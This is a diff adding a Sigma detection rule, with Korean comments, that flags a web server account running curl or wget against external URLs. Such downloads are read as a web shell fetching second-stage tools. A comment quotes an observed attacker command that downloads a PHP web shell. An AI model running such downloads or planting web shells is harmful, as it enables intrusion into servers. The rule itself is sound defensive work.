@@ -1,0 +1,45 @@
+# 막는 공격: 웹셸이 외부 URL 에서 2차 도구(다른 웹셸, 채굴기, 리버스셸 바이너리)를 받아옴
+# 탐지 근거: execve comm=curl|wget + 인자에 http(s)/ftp URL + www-data + 비대화형
+# 근거: 9/14 23:45 `sh -c curl https://raw.githubusercontent.com/.../123.php -o is.php` 실측. Suricata 는 루프백 배치라 아웃바운드 TLS 를 못 봄 → audit 이 유일한 관측점
+title: Web Process Downloads File From External URL
+id: 5f0c1c2e-3a8b-4d6e-9f11-7b2a9c4d8e10
+status: experimental
+description: >
+  www-data(uid=33)가 로그인 세션 없이 curl/wget 으로 http(s)/ftp URL 에서 파일을 받음.
+  웹셸이 2차 도구(다른 웹셸, 채굴기, 리버스셸 바이너리)를 반입하는 단계.
+author: 민혁
+date: 2026-09-15
+references:
+  - https://attack.mitre.org/techniques/T1105/
+logsource:
+  product: linux
+  service: auditd
+detection:
+  selection_tool:
+    layer_data.syscall: execve
+    layer_data.comm:
+      - curl
+      - wget
+  selection_url:
+    layer_data.exec_args|contains:
+      - 'http://'
+      - 'https://'
+      - 'ftp://'
+  selection_webuser_uid:
+    layer_data.uid: 33
+  selection_webuser_euid:
+    layer_data.euid: 33
+  filter_interactive:
+    layer_data.session_type: interactive
+  condition: selection_tool and selection_url and (selection_webuser_uid or selection_webuser_euid) and not filter_interactive
+fields:
+  - pid
+  - ppid
+  - layer_data.exec_args
+  - layer_data.cwd
+falsepositives:
+  - www-data 로 도는 배포/갱신 스크립트의 외부 다운로드 (이 환경엔 없음)
+level: high
+tags:
+  - attack.command-and-control
+  - attack.t1105
